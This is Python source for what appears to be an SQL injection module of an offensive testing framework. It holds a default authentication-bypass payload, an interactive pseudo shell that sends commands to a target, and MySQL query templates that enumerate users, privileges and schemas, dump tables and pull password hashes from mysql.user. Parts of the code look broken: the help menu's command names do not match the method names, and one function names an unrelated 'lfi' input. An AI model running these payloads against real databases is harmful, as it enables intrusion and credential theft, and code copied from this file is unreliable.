from core.base.base_module import BaseModule
from core.base.option import OptBool, OptString
from core.utils.printer import *
import difflib


class Sqli(BaseModule):

	shell_sqli = OptBool(False, "pseudo shell", "no")
	sql_request = OptString("'OR 1=1#", "sql request to execute", "yes")

	def handler_sqli(self):
		if self.shell_sqli:
			mysql = MySQL_Inband()
			while True:
				try:
					command = input(f"(sqli:cmd) {self.target}> ")
				except:
					command = input("(sqli:cmd) > ")
					
				if command == "exit":
					break
					
				elif command == "help":
					print_info("\n")
					print_info("\thelp menu sqli")
					print_info("\t--------------")
					print_info("\t?banner             return banner")
					print_info("\t?current_user       return current user")
					print_info("\t?current_db         return current database")
					print_info("\t?hostname           return server hostname")
					print_info("\t?privileges         return user privileges")
					print_info("\t?roles              return user roles")
					print_info("\t?users              return user names")
					print_info("\t?passwords          return user passwords")
					print_info("\t?dbs                return database names")
					print_info("\t?tables             return table names")
					print_info("\t?columns            return column names")
					print_info("\t?dump               return table records")
					
				elif command.startswith("?"):
					c = command.split('?')[1]
					result = getattr(mysql, c)()
					print_info(result)
					output = self.execute(command)
					print_info(output)
				else:
					output = self.execute(command)
					print_info(output)
															
		else:
			output = self.execute(self.sql_request)
			print_info(output)			


	def clean_with_template(self, lfi_text, template_text):
		""" description compare html"""
		output = ''
		t1 = lfi_text.splitlines(1)
		t2 = template_text.splitlines(1)
		diffInstance = difflib.Differ()
		diffList = list(diffInstance.compare(t1,t2))
		for line in diffList:
			if line[0] == '-':
				output+=line.strip()[2:]
				output+='\n'
		return output


# MySQL_Inband {{{
class MySQL_Inband():

  def banner(self):
    return '(SELECT VERSION() X)a'

  def current_user(self):
    return '(SELECT CURRENT_USER() X)a'

  def current_db(self):
    return '(SELECT DATABASE() X)a'

  def hostname(self):
    return '(SELECT @@HOSTNAME X)a'

  def enum_privileges(self, user):
    if user:
      c = '(SELECT COUNT(*) X FROM information_schema.user_privileges WHERE grantee="%s")a' % user
      q = '(SELECT privilege_type X FROM information_schema.user_privileges WHERE grantee="%s" LIMIT ${row_pos},${row_count})a' % user
    else:
      c = '(SELECT COUNT(*) X FROM information_schema.user_privileges)a'
      q = '(SELECT CONCAT_WS(0x3a,grantee,privilege_type) X FROM information_schema.user_privileges LIMIT ${row_pos},${row_count})a'
    return c, q

  def enum_users(self):
    c = '(SELECT COUNT(DISTINCT(grantee)) X FROM information_schema.user_privileges)a'
    q = '(SELECT DISTINCT(grantee) X FROM information_schema.user_privileges LIMIT ${row_pos},${row_count})a'
    return c, q

  def enum_passwords(self, user):
    if user:
      c = '(SELECT COUNT(*) X FROM mysql.user WHERE user="%s")a' % user
      q = '(SELECT CONCAT_WS(0x3a,host,user,authentication_string) X FROM mysql.user WHERE user="%s" LIMIT ${row_pos},${row_count})a' % user
    else:
      c = '(SELECT COUNT(*) X FROM mysql.user)a'
      q = '(SELECT CONCAT_WS(0x3a,host,user,authentication_string) X FROM mysql.user LIMIT ${row_pos},${row_count})a'

    return c, q

  def enum_dbs(self):
    c = '(SELECT COUNT(*) X FROM information_schema.schemata)a'
    q = '(SELECT schema_name X FROM information_schema.schemata LIMIT ${row_pos},${row_count})a'
    return c, q

  def enum_tables(self, db):
    if db:
      c = '(SELECT COUNT(*) X FROM information_schema.tables WHERE table_schema="%s")a' % db
      q = '(SELECT table_name X FROM information_schema.tables WHERE table_schema="%s" LIMIT ${row_pos},${row_count})a' % db

    else:
      c = '(SELECT COUNT(*) X FROM information_schema.tables)a'
      q = '(SELECT CONCAT_WS(0x3a,table_schema,table_name) X FROM information_schema.tables LIMIT ${row_pos},${row_count})a'
    return c, q

  def enum_columns(self, db, table):
    if db:
      if table:
        c = '(SELECT COUNT(*) X FROM information_schema.columns WHERE table_schema="%s" AND table_name="%s")a' % (db, table)
        q = '(SELECT column_name X FROM information_schema.columns WHERE table_schema="%s" AND table_name="%s" LIMIT ${row_pos},${row_count})a' % (db, table)
      else:
        c = '(SELECT COUNT(*) X FROM information_schema.columns WHERE table_schema="%s")a' % db
        q = '(SELECT CONCAT_WS(0x3a,table_name,column_name) X FROM information_schema.columns WHERE table_schema="%s" LIMIT ${row_pos},${row_count})a' % db
    else:
      c = '(SELECT COUNT(*) X FROM information_schema.columns)a'
      q = '(SELECT CONCAT_WS(0x3a,table_schema,table_name,column_name) X FROM information_schema.columns LIMIT ${row_pos},${row_count})a'
    return c, q

  def dump_table(self, db, table, cols):
    if not (db and table and cols):
      raise NotImplementedError('-D, -T and -C required')

    c = '(SELECT COUNT(*) X FROM %s.%s)a' % (db, table)
    q = '(SELECT CONCAT_WS(0x3a,%s) X FROM %s.%s LIMIT ${row_pos},${row_count})a' % (','.join(cols.split(',')), db, table)
    return c, q
